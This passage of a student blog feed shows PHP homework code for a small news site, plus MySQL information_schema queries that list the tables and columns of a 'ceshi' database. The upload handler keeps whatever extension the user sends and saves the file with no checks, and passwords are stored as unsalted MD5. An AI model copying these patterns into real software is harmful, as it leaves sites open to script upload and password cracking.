href=&quot;index.php&quot;&gt;新闻界面&lt;/th&gt;&lt;/tr&gt;</span><br><span class="line">        &lt;/table&gt;</span><br><span class="line"></span><br><span class="line">EOF;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;div style=&quot;width:100%;text-align:center&quot;&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=&quot;xiugaimimahoutai.php&quot; method=&quot;post&quot; &gt;</span><br><span class="line">    &lt;h3&gt;&lt;p&gt;原密码&lt;/p&gt;&lt;/h3&gt;</span><br><span class="line">    &lt;p&gt;&lt;input type=&quot;password&quot; name=&quot;ypasswd&quot; &gt;&lt;/p&gt;</span><br><span class="line">    &lt;h3&gt;&lt;p&gt;修密码&lt;/p&gt;&lt;/h3&gt;</span><br><span class="line">    &lt;p&gt;&lt;input type=&quot;password&quot; name=&quot;tpasswd&quot; &gt;&lt;/p&gt;</span><br><span class="line">    &lt;h3&gt;&lt;p&gt;再次输入密码&lt;/p&gt;&lt;/h3&gt;</span><br><span class="line">    &lt;p&gt;&lt;input type=&quot;password&quot; name=&quot;tpasswd2&quot; &gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;提交&quot;&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">Require_once &apos;../basedir/footer.php&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">后端</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">error_reporting(E_ALL^E_NOTICE);</span><br><span class="line"></span><br><span class="line">$uname = base64_encode($_SESSION[&apos;username&apos;]);</span><br><span class="line"></span><br><span class="line">$upass = md5($_POST[&apos;ypasswd&apos;]);</span><br><span class="line"></span><br><span class="line">$q = 0;</span><br><span class="line"></span><br><span class="line">if ($uname &amp;&amp; $upass)&#123;</span><br><span class="line">//    echo base64_decode($uname);</span><br><span class="line">    $f = fopen(&apos;../data/yonghuxinxiwenjian/yh.db&apos;,&apos;r&apos;);</span><br><span class="line">    while (!feof($f))&#123;</span><br><span class="line">        $data = fgets($f);</span><br><span class="line">        $arr = explode(&apos;|&apos;,$data);</span><br><span class="line"></span><br><span class="line">        if(count($arr) !=4 )&#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">//        echo $arr[0];</span><br><span class="line">//        echo &apos;:&apos;;</span><br><span class="line">//        echo $uname;</span><br><span class="line">//        echo &apos;&lt;br&gt;&apos;;</span><br><span class="line">//        echo $arr[1];</span><br><span class="line">//        echo &apos;:&apos;;</span><br><span class="line">//        echo $upass;</span><br><span class="line">//        echo &apos;&lt;br&gt;&apos;;</span><br><span class="line">        if ($arr[0] == $uname &amp;&amp; $arr[1] == $upass)&#123;</span><br><span class="line">                $q = 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if($q == 0)&#123;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&apos;原密码错误！&apos;);location.href=&apos;xiugaimima.php&apos;;&lt;/script&gt;&quot;;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = 0;</span><br><span class="line"></span><br><span class="line">if ($_POST[&apos;tpasswd&apos;] != $_POST[&apos;tpasswd2&apos;])&#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&apos;两次输入的密码不正确&apos;);location.href=&apos;xiugaimima.php&apos;;&lt;/script&gt;&quot;;</span><br><span class="line">    die();</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $a=1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($q &amp;&amp; $a)&#123;</span><br><span class="line"></span><br><span class="line">    $filePath = &apos;../data/yonghuxinxiwenjian/yh.db&apos;;</span><br><span class="line">    $target= md5($_POST[&apos;ypasswd&apos;]);</span><br><span class="line">    $result = null;</span><br><span class="line">    $fileCont = file_get_contents($filePath);</span><br><span class="line"></span><br><span class="line">    $target = base64_encode($_SESSION[&apos;username&apos;]).&apos;|&apos;.$target;</span><br><span class="line">//    echo $target;</span><br><span class="line">//    echo &apos;&lt;br&gt;&apos;;</span><br><span class="line">//    echo $fileCont;</span><br><span class="line">//    echo &apos;&lt;br&gt;&apos;;</span><br><span class="line">    $targetIndex = strpos($fileCont, $target); #查找目标字符串的坐标</span><br><span class="line">    echo $targetIndex;</span><br><span class="line">    if ($targetIndex !== false) &#123;</span><br><span class="line"></span><br><span class="line">        #找到target的前一个换行符</span><br><span class="line">        $preChLineIndex = strrpos(substr($fileCont, 0, $targetIndex+1), &quot;\n&quot;);</span><br><span class="line">        var_dump($preChLineIndex);</span><br><span class="line">//        var_dump($targetIndex);</span><br><span class="line">//        var_dump($preChLineIndex);</span><br><span class="line"></span><br><span class="line">        #找到target的后一个换行符</span><br><span class="line">        $AfterChLineIndex = strpos(substr($fileCont, $targetIndex), &quot;\n&quot;) + $targetIndex;</span><br><span class="line"></span><br><span class="line">        $tihuanhang = substr($fileCont,$preChLineIndex,$AfterChLineIndex);</span><br><span class="line"></span><br><span class="line">        $target2 =  base64_encode($_SESSION[&apos;username&apos;]).&apos;|&apos;.md5($_POST[&apos;tpasswd&apos;]);</span><br><span class="line">        var_dump($target2);</span><br><span class="line">        var_dump($target);</span><br><span class="line"></span><br><span class="line">        $tihuanhang =  str_replace($target,$target2,$tihuanhang);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        var_dump($tihuanhang);</span><br><span class="line">        var_dump($AfterChLineIndex);</span><br><span class="line">        if (($preChLineIndex !== false || $preChLineIndex == 0) &amp;&amp; $AfterChLineIndex !== false) &#123;</span><br><span class="line">            #重新写入删掉指定行后的内容</span><br><span class="line">            $result = substr($fileCont, 0, $preChLineIndex + 1) .$tihuanhang. substr($fileCont, $AfterChLineIndex + 1);</span><br><span class="line">            file_put_contents($filePath, $result);</span><br><span class="line">            $fp = fopen($filePath, &quot;w+&quot;);</span><br><span class="line">            fwrite($fp, $result);</span><br><span class="line">            fclose($fp);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        echo &quot;&lt;script&gt;alert(&apos;密码修改成功&apos;);location.href=&apos;xiugaimima.php&apos;;&lt;/script&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="用户退出功能"><a href="#用户退出功能" class="headerlink" title="用户退出功能"></a>用户退出功能</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">后端</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">error_reporting(E_ALL^E_NOTICE);</span><br><span class="line">unset($_SESSION[&apos;username&apos;]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;script&gt;alert(&apos;登出成功！将跳转到主页！&apos;);location.href=&apos;index.php&apos;;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h1 id="增加新闻功能"><a href="#增加新闻功能" class="headerlink" title="增加新闻功能"></a>增加新闻功能</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">前端</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">error_reporting(E_ALL^E_NOTICE);</span><br><span class="line">if(!isset($_SESSION[&apos;username&apos;]))&#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&apos;请登录后查看！&apos;);location.href=&apos;login.php&apos;;&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    Require_once &apos;../basedir/header.php&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;div style=&quot;width:100%;text-align:center&quot;&gt;</span><br><span class="line">        &lt;h1&gt;增加新闻&lt;/h1&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;hr&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php</span><br><span class="line"></span><br><span class="line">    session_start();if(isset($_SESSION[&apos;username&apos;]))&#123;</span><br><span class="line">        echo &lt;&lt;&lt;EOF</span><br><span class="line">        </span><br><span class="line">    &lt;table align=&quot;center&quot; width=&quot;600&quot;&gt;</span><br><span class="line">        &lt;tr &gt;&lt;th id=&quot;sctx&quot;&gt;&lt;a href=&quot;shangchuantouxiang.php&quot;&gt;上传头像&lt;/a&gt;&lt;/th&gt;&lt;th id=&quot;xwjm&quot;&gt;&lt;a href=&quot;index.php&quot;&gt;新闻界面&lt;/th&gt;&lt;th id=&quot;scxw&quot;&gt;&lt;a href=&quot;shanchuxinwen.php&quot;&gt;删除新闻&lt;/th&gt;&lt;th id=&quot;xgmm&quot;&gt;&lt;a href=&quot;xiugaimima.php&quot;&gt;修改密码&lt;/th&gt;&lt;/tr&gt;</span><br><span class="line">    &lt;/table&gt;</span><br><span class="line"></span><br><span class="line">EOF;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;div style=&quot;width:100%;text-align:center&quot;&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;h3&gt;骚年请上传新闻&lt;/h3&gt;</span><br><span class="line">            &lt;form action=&quot;zengjiaxinwenhoutai.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">                &lt;h5&gt;&lt;p&gt;热度:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;redu&quot; id=&quot;redu&quot; &gt;&lt;/p&gt;&lt;/h5&gt;</span><br><span class="line"></span><br><span class="line">                &lt;h5&gt;&lt;p&gt;标题:&lt;br&gt;&lt;input type=&quot;text&quot; name=&quot;biaoti&quot; id=&quot;biaoti&quot; &gt;&lt;/p&gt;&lt;/h5&gt;</span><br><span class="line"></span><br><span class="line">                &lt;p&gt;&lt;input type=&quot;file&quot; name=&quot;Filedata&quot; &gt;&lt;br&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                &lt;h5&gt;&lt;p&gt;简介:&lt;br&gt;&lt;textarea name=&quot;jianjie&quot;  placeholder=&quot;输入新闻内容&quot;  rows=&quot;10&quot; cols=&quot;50&quot; &gt;&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;/h5&gt;</span><br><span class="line">                &lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;提交&quot;&gt;&lt;/p&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    Require_once &apos;../basedir/footer.php&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">后端</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL^E_NOTICE);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$redu = $_POST[&quot;redu&quot;];</span><br><span class="line">$biaoti = base64_encode(htmlspecialchars($_POST[&quot;biaoti&quot;]));</span><br><span class="line">$zuozhe = base64_encode($_SESSION[&apos;username&apos;]);</span><br><span class="line"></span><br><span class="line">$time = time(); //时间戳</span><br><span class="line">$shijian = base64_encode(date( &apos;Y-m-d H:i:s&apos;, $time)); //生成带格式的日期</span><br><span class="line"></span><br><span class="line">//上传文件部分</span><br><span class="line">$name = explode(&apos;.&apos;,$_FILES[&apos;Filedata&apos;][&apos;name&apos;]); //取出上传文件的后缀</span><br><span class="line">var_dump($_FILES[&apos;Filedata&apos;][&apos;name&apos;]);</span><br><span class="line">$houzhui = &apos;.&apos;.end($name);//将后缀和.合起来，变成.xxx</span><br><span class="line"></span><br><span class="line">var_dump($houzhui);</span><br><span class="line"></span><br><span class="line">$wjm = $_SESSION[&apos;username&apos;].time().$houzhui;//生成一个文件名:登录名+时间戳+后缀</span><br><span class="line">$lujing = &quot;../data/xinwenwenjian/&quot;.$wjm; //将路径和文件名合并在一起。生成保存路径</span><br><span class="line">move_uploaded_file($_FILES[&apos;Filedata&apos;][&apos;tmp_name&apos;],$lujing);//将文件从临时文件转移到自己定义的路径中</span><br><span class="line">$lujing = base64_encode(&quot;&#123;$lujing&#125;&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$jianjie = base64_encode(htmlspecialchars($_POST[&quot;jianjie&quot;]));</span><br><span class="line"></span><br><span class="line">$qwe = &quot;$redu|$biaoti|$zuozhe|$shijian|$lujing|$jianjie&quot;.&quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">$f = fopen(&quot;../data/xinwenwenjian/new.db&quot;,&quot;a+&quot;);</span><br><span class="line"></span><br><span class="line">fwrite($f,$qwe);</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;script&gt;alert(&apos;新闻上传成功&apos;);location.href=&apos;zengjiaxinwen.php&apos;;&lt;/script&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="点击显示更多新闻"><a href="#点击显示更多新闻" class="headerlink" title="点击显示更多新闻"></a>点击显示更多新闻</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Require_once</span> <span class="string">'../basedir/header.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action = $_GET[<span class="string">'action'</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div style=<span class="string">"width:100%;text-align:center"</span>&gt;</span><br><span class="line">    &lt;h1&gt;新闻详情&lt;/h1&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;hr&gt;</span><br><span class="line"></span><br><span class="line">&lt;table align=<span class="string">"center"</span> width=<span class="string">"600"</span>&gt;</span><br><span class="line">    &lt;tr &gt;&lt;th id=<span class="string">"xwjm"</span>&gt;&lt;a href=<span class="string">"index.php"</span>&gt;新闻界面&lt;/th&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$f = fopen(<span class="string">'../data/xinwenwenjian/new.db'</span>,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">while</span> (!feof($f))&#123;</span><br><span class="line">    $str = fgets($f);</span><br><span class="line"></span><br><span class="line">    $shuzu = explode(<span class="string">"|"</span>,$str);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(count($shuzu) !=<span class="number">6</span>)&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $shuzu = explode(<span class="string">'|'</span>,$str);<span class="comment">//按照|进行分割</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(trim(base64_decode($shuzu[<span class="number">1</span>])) == $action)&#123;</span><br><span class="line"></span><br><span class="line">        $biaoti = base64_decode($shuzu[<span class="number">1</span>]);</span><br><span class="line">        $jianjie= base64_decode($shuzu[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">    &lt;table align="center"&gt;</span></span><br><span class="line"><span class="string">            &lt;tr&gt;</span></span><br><span class="line"><span class="string">                &lt;td align="center"&gt;&lt;h2&gt;<span class="subst">&#123;$biaoti&#125;</span>&lt;/h2&gt;&lt;/td&gt;            </span></span><br><span class="line"><span class="string">                &lt;/tr&gt;</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">                &lt;tr&gt;            </span></span><br><span class="line"><span class="string">                &lt;td colspan="3" align="center" &gt;&lt;h3&gt;<span class="subst">&#123;$jianjie&#125;</span>&lt;/h3&gt; &lt;/td&gt;</span></span><br><span class="line"><span class="string">            &lt;/tr&gt;</span></span><br><span class="line"><span class="string">    &lt;/table&gt;</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Require_once</span> <span class="string">'../basedir/footer.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是一个作业&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>8.12作业</title>
    <link href="https://0xxk.github.io/2019/08/12/8.12/"/>
    <id>https://0xxk.github.io/2019/08/12/8.12/</id>
    <published>2019-08-12T09:46:20.580Z</published>
    <updated>2019-08-12T15:20:29.773Z</updated>
    
    <content type="html"><![CDATA[<p>放在了ceshi数据库里</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">通过查找TABLES中数据库属于ceshi的表明，来找到对应的表名</span><br><span class="line">select * from information_schema.TABLES where TABLE_SCHEMA=&apos;ceshi&apos;;</span><br><span class="line"> select table_nAME from information_schema.TABLES where TABLE_SCHEMA=&apos;ceshi&apos;;</span><br><span class="line">+------------+</span><br><span class="line">| TABLE_NAME |</span><br><span class="line">+------------+</span><br><span class="line">| content    |</span><br><span class="line">| users      |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p>通过查找columns中表属于content表的字段，来找到对应content表的字段名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from information_schema.COLUMNS where TABLE_NAME=&apos;content&apos;;</span><br><span class="line">+---------------+--------------+------------+-------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-----------------+------------------+------------+----------------+---------------------------------+----------------+-----------------------+--------+</span><br><span class="line">| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | ORDINAL_POSITION | COLUMN_DEFAULT | IS_NULLABLE | DATA_TYPE | CHARACTER_MAXIMUM_LENGTH | CHARACTER_OCTET_LENGTH | NUMERIC_PRECISION | NUMERIC_SCALE | DATETIME_PRECISION | CHARACTER_SET_NAME | COLLATION_NAME  | COLUMN_TYPE      | COLUMN_KEY | EXTRA          | PRIVILEGES                      | COLUMN_COMMENT | GENERATION_EXPRESSION | SRS_ID |</span><br><span class="line">+---------------+--------------+------------+-------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-----------------+------------------+------------+----------------+---------------------------------+----------------+-----------------------+--------+</span><br><span class="line">| def           | ceshi        | content    | id          |                1 | NULL           | NO          | int       |                     NULL |                   NULL |                10 |             0 |               NULL | NULL               | NULL            | int(10) unsigned | PRI        | auto_increment | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">| def           | ceshi        | content    | title       |                2 | NULL           | NO          | varchar   |                      100 |                    300 |              NULL |          NULL |               NULL | utf8               | utf8_general_ci | varchar(100)     |            |                | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">| def           | ceshi        | content    | author      |                3 | NULL           | NO          | varchar   |                       40 |                    120 |              NULL |          NULL |               NULL | utf8               | utf8_general_ci | varchar(40)      |            |                | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">| def           | ceshi        | content    | value       |                4 | NULL           | NO          | text      |                    65535 |                  65535 |              NULL |          NULL |               NULL | utf8               | utf8_general_ci | text             |            |                | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">| def           | ceshi        | content    | time        |                5 | NULL           | NO          | varchar   |                       40 |                    120 |              NULL |          NULL |               NULL | utf8               | utf8_general_ci | varchar(40)      |            |                | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">| def           | ceshi        | content    | ip          |                6 | NULL           | NO          | varchar   |                       40 |                    120 |              NULL |          NULL |               NULL | utf8               | utf8_general_ci | varchar(40)      |            |                | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">+---------------+--------------+------------+-------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-----------------+------------------+------------+----------------+---------------------------------+----------------+-----------------------+--------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>通过查找columns中表属于users表的字段，来找到对应users表的字段名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from information_schema.COLUMNS where TABLE_NAME=&apos;users&apos;;</span><br><span class="line">或将 * 换成column_name</span><br><span class="line">+---------------+--------------------+------------+---------------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-----------------+------------------+------------+----------------+---------------------------------+----------------+-----------------------+--------+</span><br><span class="line">| TABLE_CATALOG | TABLE_SCHEMA       | TABLE_NAME | COLUMN_NAME         | ORDINAL_POSITION | COLUMN_DEFAULT | IS_NULLABLE | DATA_TYPE | CHARACTER_MAXIMUM_LENGTH | CHARACTER_OCTET_LENGTH | NUMERIC_PRECISION | NUMERIC_SCALE | DATETIME_PRECISION | CHARACTER_SET_NAME | COLLATION_NAME  | COLUMN_TYPE      | COLUMN_KEY | EXTRA          | PRIVILEGES                      | COLUMN_COMMENT | GENERATION_EXPRESSION | SRS_ID |</span><br><span class="line">+---------------+--------------------+------------+---------------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-----------------+------------------+------------+----------------+---------------------------------+----------------+-----------------------+--------+</span><br><span class="line">| def           | ceshi              | users      | id                  |                1 | NULL           | NO          | int       |                     NULL |                   NULL |                10 |             0 |               NULL | NULL               | NULL            | int(10) unsigned | PRI        | auto_increment | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">| def           | ceshi              | users      | username            |                2 | NULL           | NO          | varchar   |                       20 |                     60 |              NULL |          NULL |               NULL | utf8               | utf8_general_ci | varchar(20)      | UNI        |                | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">| def           | ceshi              | users      | passwd              |                3 | NULL           | NO          | varchar   |                      100 |                    300 |              NULL |          NULL |               NULL | utf8               | utf8_general_ci | varchar(100)     |            |                | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">| def           | ceshi              | users      | user_ip             |                4 | NULL           | NO          | varchar   |                       20 |                     60 |              NULL |          NULL |               NULL | utf8               | utf8_general_ci | varchar(20)      |            |                | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">| def           | ceshi              | users      | join_date           |                5 | NULL           | NO          | varchar   |                       40 |                    120 |              NULL |          NULL |               NULL | utf8               | utf8_general_ci | varchar(40)      |            |                | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">| def           | performance_schema | users      | USER                |                1 | NULL           | YES         | char      |                       32 |                    128 |              NULL |          NULL |               NULL | utf8mb4            | utf8mb4_bin     | char(32)         | UNI        |                | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">| def           | performance_schema | users      | CURRENT_CONNECTIONS |                2 | NULL           | NO          | bigint    |                     NULL |                   NULL |                19 |             0 |               NULL | NULL               | NULL            | bigint(20)       |            |                | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">| 